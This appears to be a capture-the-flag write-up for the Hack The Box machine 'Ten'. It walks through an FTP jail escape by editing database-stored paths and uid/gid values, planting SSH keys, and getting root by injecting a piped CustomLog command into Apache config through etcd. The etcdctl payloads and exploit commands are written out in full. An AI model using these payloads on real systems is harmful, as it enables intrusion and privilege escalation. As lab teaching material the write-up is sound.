# HTB: Ten

**Difficulty:** Easy **OS:** Linux (Ubuntu) **Target IP:** 10.129.234.158 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```
nmap -p21,22,80 10.129.234.158 -sCV -oA nmap/nmap
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Page moved.
```

Three services: FTP, SSH, and HTTP. The `Page moved` title on port 80 meant the root page was redirecting somewhere, and the presence of an anonymous-login-disabled FTP server sitting next to a web server hinted that the two were probably connected — a common pattern on "hosting provider" style HTB boxes is a website that issues you FTP credentials to upload your own content.

### Directory Enumeration

```
gobuster dir -u http://10.129.234.158 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php
```

```
index.php            (Status: 200) [Size: 5131]
info.php             (Status: 200) [Size: 74345]
signup.php           (Status: 200) [Size: 4050]
dist                 (Status: 301)
```

`signup.php` stood out immediately — a sign-up page implies self-service account creation, which lined up with my suspicion about the FTP server.

---

## 2. Foothold — Self-Service FTP Account via `signup.php`

### 2.1 Requesting an Account

Inspecting `signup.php` in the browser, submitting the form fires a request to a backend endpoint:

```
POST /get-credentials-please-do-not-spam-this-thanks.php HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary...
Content-Disposition: form-data; name="domain"

test123
------WebKitFormBoundary...
```

```
OK
Your personal account is ready to be used:
Username: ten-6a9c0045
Password: 71e79f38
Personal Domain: test123.ten.vl
You can use the provided credentials to upload your pages via ftp://ten.vl.
```

This confirmed the design: submitting a "domain" name (`test123`) provisions a personal FTP account (`ten-6a9c0045`) whose home directory gets served as a virtual host at `test123.ten.vl`. This is essentially a free-hosting-style self-service platform — and self-provisioned, low-trust accounts on a shared host are exactly the kind of feature that tends to hide privilege boundaries worth testing.

I added both hostnames to `/etc/hosts`:

```
10.129.234.158  ten.vl test123.ten.vl
```

### 2.2 Confirming FTP Access

```
ftp 10.129.234.158
Name: ten-6a9c0045
Password: 71e79f38
230 OK. Current directory is /
```

Login succeeded immediately, confirming the credentials work exactly as advertised — I had a legitimate, low-privilege FTP account, scoped (in theory) to my own personal directory.

---

## 3. Discovering webdb.ten.vl and Leaking FTP User Hashes

### 3.1 Subdomain Fuzzing

Since `ten.vl` had already proven to be a base domain with dynamically-created subdomains, I fuzzed for any additional, statically-configured vhosts rather than dynamically-provisioned ones:

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://ten.vl -H "Host: FUZZ.ten.vl" -fs 205
```

```
webdb    [Status: 200, Size: 1685]
```

`webdb.ten.vl` turned up — a strong lead, since "webdb" strongly suggests some kind of web-based database administration tool.

### 3.2 Accessing webdb — an Adminer-style DB Client with a "Guess" Login

Adding `webdb.ten.vl` to `/etc/hosts` and browsing to it showed a database login page. My own FTP credentials didn't work against it (they're FTP creds, not DB creds, and there was no reason to expect they'd overlap), but the page had a convenient **"Guess credentials"** button that logged me straight in — implying either default/guessable database credentials were pre-filled, or the tool was intentionally left open for testing purposes.

Once in, I was looking at a MySQL browser interface pointed at `127.0.0.1:3306`. Navigating its table browser to:

```
http://webdb.ten.vl/#/user@127.0.0.1:3306/pureftpd/users/explore;chips=;field=;direction=;page=0;pageSize=50
```

...opened the `pureftpd.users` table directly — the backing database for the Pure-FTPd server itself. This returned every provisioned FTP account on the box, including password hashes:

```
id  user            password                            uid    gid    dir
1   ten-6a9c0045    $1$OWNhNDE$lLiHPbaY3ZHrulP081jW9/    40512  40512  /srv/ten-6a9c0045/./
2   ten-379b3b82    $1$OWNhNDE$D54VV1VllUWmDDX.k.VGL1    53974  53974  /srv/ten-379b3b82/./
```

This is a serious information leak on its own (every self-provisioned account's password hash, in a table I had no business being able to browse), but the more interesting detail was the `dir` column: `/srv/ten-6a9c0045/./`. Pure-FTPd was clearly storing each user's **jailed home directory path** as a literal, editable string in this table — and a web tool exists that lets me browse and (potentially) edit arbitrary rows in that table.

---

## 4. FTP Chroot Escape via Database-Stored Home Directory

### 4.1 The Core Idea

Pure-FTPd normally "jails" each user to their own home directory (`/srv/ten-6a9c0045/`) so they can't browse the rest of the filesystem. But that jail path isn't a kernel-enforced chroot baked into the binary — it's read from the `dir` column in this very MySQL table on each login. If I could modify what my own account's `dir` value pointed to, Pure-FTPd would happily chroot me somewhere else entirely on my *next* login.

The `webdb` interface I had access to lets you browse and edit table rows directly, giving me exactly that capability.

### 4.2 Escalating the Directory, One Level at a Time

I edited my own `dir` field for `ten-6a9c0045` and reconnected via FTP after each change, walking the path upward:

**Step 1 — `/srv/./`:**
```
ftp> ls
drwxr-xr-x  ten-379b3b82
drwxr-xr-x  ten-6a9c0045
```
This confirmed the edit took effect — I was now chrooted to `/srv/`, one level above my own personal directory, and could see every other customer's directory on the box.

**Step 2 — `/../` (root filesystem):**
```
ftp> ls
bin -> usr/bin
boot
etc
home
root
srv
...
```
Editing the path to walk up further (`/srv/../`) broke the jail out to the actual filesystem root — `/`. From here I was reading the entire filesystem as an FTP client, subject only to standard Unix file permissions (not the FTP jail, since that no longer applied). This is effectively a full directory-traversal / chroot-bypass vulnerability, just reached through a database edit rather than a raw path-traversal payload in the FTP protocol itself.

### 4.3 Locating a Real User

From `/etc/passwd` (pulled straight over FTP) I found a genuine interactive user:

```
tyrell:x:1000:1000:Tyrell W.:/home/tyrell:/bin/bash
```

I initially tried browsing into `/home/tyrell`, but its permissions (`drwxr-x---`, owned by `tyrell:tyrell`) blocked access — my FTP session's numeric uid/gid (`40512`) wasn't `1000`, so Unix permissions correctly denied me.

### 4.4 Escalating Further — Editing uid/gid, Not Just Path

Since `webdb` let me edit arbitrary columns in that same table, and the table also stored `uid`/`gid`, I edited my own row's `uid` and `gid` fields to `1000` — Tyrell's numeric IDs — instead of just the directory path. Reconnecting to FTP now had the server treating my session as if it belonged to Tyrell's actual Unix identity for permission purposes, while my chroot path (already walked up to `/`) let me freely navigate there:

```
ftp> cd home/tyrell
ftp> ls -la
drwx------  .ssh
-r--------  .user.txt
```

I could now list Tyrell's home directory contents, including `.ssh/` and the protected `.user.txt` flag file (though the file's own `-r--------` permission still blocked reading it directly as a non-owner over plain `ls`/`get` — the uid spoof got me visibility and directory traversal, not a full identity swap for every operation).

### 4.5 Planting an SSH Key

`.ssh` itself, however, was accessible for **writing** with my spoofed uid/gid (since I now matched the owning uid for filesystem permission checks on write). I generated a fresh SSH keypair locally and uploaded the public half directly as `authorized_keys`:

```bash
ssh-keygen -t ed25519 -f ten_tyrell -N ""
```

```
ftp> cd /home/tyrell/.ssh
ftp> put ten_tyrell.pub authorized_keys
226 File successfully transferred
```

### 4.6 Logging In as Tyrell

```
ssh -i ten_tyrell tyrell@ten.vl
```

```
tyrell@ten:~$ whoami
tyrell
```

✅ **Foothold obtained** — a full interactive SSH session as `tyrell`, achieved entirely through the FTP/database chroot-escape chain: leaking DB-stored FTP metadata via `webdb`, editing that metadata to escape the FTP jail and spoof a Unix identity, then planting an SSH key once directory permissions allowed a write.

---

## 5. Privilege Escalation — Abusing `etcd` + `remco` Config Templating

### 5.1 Discovering etcd

Checking listening services from inside:

```
ss -tulnp
```

```
tcp  LISTEN  127.0.0.1:2379    (etcd client port)
tcp  LISTEN  127.0.0.1:2380
tcp  LISTEN  127.0.0.1:22071
tcp  LISTEN  127.0.0.1:4001
```

```
curl -s http://127.0.0.1:2379/version
{"etcdserver":"3.5.13","etcdcluster":"3.5.0"}
```

```
ps aux | grep etcd
root  1581  ... /usr/local/bin/etcd --name=etcd --listen-client-urls=http://0.0.0.0:2379 ...
```

**etcd** is a distributed key-value store, commonly used to hold shared configuration data — and critically, this instance was running as **root**, with its client API bound (at least locally) with no authentication. Since Tyrell's account could reach `127.0.0.1:2379` freely, I had full read/write access to whatever configuration data lived in it.

### 5.2 Reading etcd's Contents

```bash
ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 get "" --prefix
```

```
/customers/ten-379b3b82/url
test123
/customers/ten-6a9c0045/url
test123
```

This was an important find: etcd was storing the exact same `url` value (`test123`) tied to each FTP customer account I'd seen earlier in the `webdb` MySQL table — meaning **etcd is the live backing store that drives the Apache virtual host configuration** for each customer's site. I confirmed my write access worked with a harmless test key:

```bash
etcdctl put /customers/test/test hello
etcdctl get /customers/test/test
# hello
```

### 5.3 Finding the Config-Generation Pipeline

To understand exactly how etcd values become live Apache config, I searched the filesystem for anything referencing customer virtual hosts:

```bash
grep -RniE 'customers|010-customers|DocumentRoot|ServerName|ten\.vl' /etc /usr/local /opt
```

This surfaced the full pipeline:

```
/etc/remco/config
/etc/remco/templates/010-customers.conf.tmpl
```

**`/etc/remco/config`:**
```toml
[[resource]]
name = "apache2"

[[resource.template]]
  src = "/etc/remco/templates/010-customers.conf.tmpl"
  dst = "/etc/apache2/sites-enabled/010-customers.conf"
  reload_cmd = "systemctl restart apache2.service"

  [resource.backend.etcd]
    nodes = ["http://127.0.0.1:2379"]
    keys = ["/customers"]
    watch = true
```

**`010-customers.conf.tmpl`:**
```
{% for customer in lsdir("/customers") %}
  {% if exists(printf("/customers/%s/url", customer)) %}

<VirtualHost *:80>
        ServerName {{ getv(printf("/customers/%s/url",customer)) }}.ten.vl
        DocumentRoot /srv/{{ customer }}/
</VirtualHost>

  {% endif %}
{% endfor %}
```

This confirmed the whole chain: **remco** (a config templating daemon, running via a systemd service) watches the `/customers` prefix in etcd, and any time a value changes, it re-renders this Jinja-style template into `/etc/apache2/sites-enabled/010-customers.conf` — the **live Apache config file** — and then automatically runs `systemctl restart apache2.service` to reload it. Critically, the customer-supplied `url` value gets substituted directly into the template with **no sanitization or escaping**, and remco itself runs as **root** (confirmed via `systemctl cat remco`, showing a standard root-owned systemd service with no `User=` directive, meaning it defaults to root).

This is a textbook **config injection** vulnerability: I control a value that's interpolated unescaped into a config file that a root process then writes to disk and immediately loads.

### 5.4 Proving Config Injection

I set my own customer's `url` value to include a newline and an extra directive, to see if it would break out of the intended single-line `ServerName` context:

```bash
etcdctl put /customers/ten-6a9c0045/url $'test123\n# HTB_TEST'
```

```
cat /etc/apache2/sites-enabled/010-customers.conf
```
```apache
<VirtualHost *:80>
        ServerName test123
# HTB_TEST.ten.vl
        DocumentRoot /srv/ten-6a9c0045/
</VirtualHost>
```

Confirmed — the newline in my value split across two lines in the generated config exactly as injected, meaning I could insert **any arbitrary Apache directive** on its own line inside the `<VirtualHost>` block.

### 5.5 Weaponizing It — Injecting a CustomLog Directive

Apache's `CustomLog` directive supports piping log output to an arbitrary shell command (`CustomLog "|/path/to/program" format`) — a legitimate feature for custom log processing, but a direct command-execution primitive if I can inject it. I tested this first with a simple file write:

```bash
etcdctl put /customers/ten-6a9c0045/url $'test123\nCustomLog "|/bin/echo HTB_TEST >> /tmp/htb_test" combined\n#'
```

The generated config confirmed the directive landed cleanly, with the trailing `#` neutralizing the rest of the original template line as a comment so the config stayed syntactically valid.

Since Apache (and by extension remco's `reload_cmd`, `systemctl restart apache2.service`) runs the resulting pipe command **as root** the moment the config is reloaded and a request triggers logging, this gave me arbitrary command execution as root.

### 5.6 Escalating to Root

I injected a directive to copy my own SSH public key into root's `authorized_keys`:

```bash
etcdctl put /customers/ten-6a9c0045/url $'privesc\nCustomLog "|/bin/cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common\n#'
```

Once remco picked up the change and reloaded Apache, I triggered the log write by making any request to that vhost (any request logs a line, which invokes the piped command):

```bash
curl -s -H 'Host: privesc.ten.vl' http://127.0.0.1/ >/dev/null
```

This ran `/bin/cp` as root, copying Tyrell's `authorized_keys` (containing the key I'd already planted for my own access) directly into `/root/.ssh/authorized_keys`.

```bash
ssh -i ten_tyrell root@10.129.234.158
```

```
root@ten:~# whoami
root
```

✅ **Full compromise** — root access obtained by chaining an unauthenticated etcd write into a root-owned config-templating pipeline, abusing an unsanitized `CustomLog` directive injection for command execution.

---

## 6. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` → FTP + SSH + Apache; `gobuster` found `signup.php` |
| Account creation | Self-service `signup.php` issued real FTP credentials and a personal vhost, exactly as advertised |
| Info leak | Subdomain fuzzing found `webdb.ten.vl`, an exposed DB browser with a one-click "guess" login, exposing the Pure-FTPd backing MySQL table (usernames, password hashes, uid/gid, chroot paths) |
| FTP jail escape | Edited my own `dir` (and later `uid`/`gid`) values via `webdb`'s table editor — Pure-FTPd trusted these DB fields at login time, letting me walk out of my chroot to `/` and spoof another user's Unix identity |
| Foothold | Used write access (via the spoofed uid) to plant an SSH public key in `tyrell`'s `.ssh/authorized_keys` → SSH in as `tyrell` |
| Privesc discovery | Found `etcd` (root-owned, unauthenticated on localhost) driving a **remco** config-templating pipeline that regenerates live Apache vhost config from etcd values with no sanitization |
| Privesc | Injected a newline + `CustomLog "|<command>"` directive into a customer's `url` value in etcd → root-owned Apache reload executes arbitrary shell command as root on next logged request |
| Root | Used the injection to copy my SSH key into `/root/.ssh/authorized_keys` → SSH in as root |

**Root cause / lessons learned:**

- Storing security-relevant state (chroot jail paths, uid/gid) in a database that's reachable and editable through an unrelated, loosely-secured admin tool (`webdb`, with a one-click bypass login) turns "just an admin convenience panel" into a full authorization bypass for a completely different service (FTP).
- Any value that ends up interpolated into a config file — especially one reloaded and executed by a privileged process — must be strictly validated/escaped. A single unescaped newline was enough to inject arbitrary Apache directives.
- Apache's `CustomLog "|command"` piped-logging feature is powerful and legitimate, but it's also a direct root-level command execution primitive the moment an attacker can influence what gets written into a vhost config that a root process reloads.
- Defense in depth matters: this chain only worked end-to-end because *multiple* individually-"minor" issues lined up — a leaky admin tool, DB-trusted FTP jail logic, an unauthenticated internal etcd instance, and unsanitized templating all had to be present together.

---

## 7. Tools Used

- `nmap`, `gobuster`, `ffuf` — reconnaissance and enumeration
- Standard `ftp` client — exploiting the DB-driven chroot escape
- `webdb` (the box's own exposed Adminer-style tool) — leaking and editing the Pure-FTPd MySQL backing table
- `ssh-keygen` / `ssh` — key-based access after planting `authorized_keys`
- `etcdctl` (etcd v3 API) — reading/writing the configuration values that drove the root-owned `remco` → Apache templating pipeline
- `curl` — triggering the injected `CustomLog` command by generating a logged request
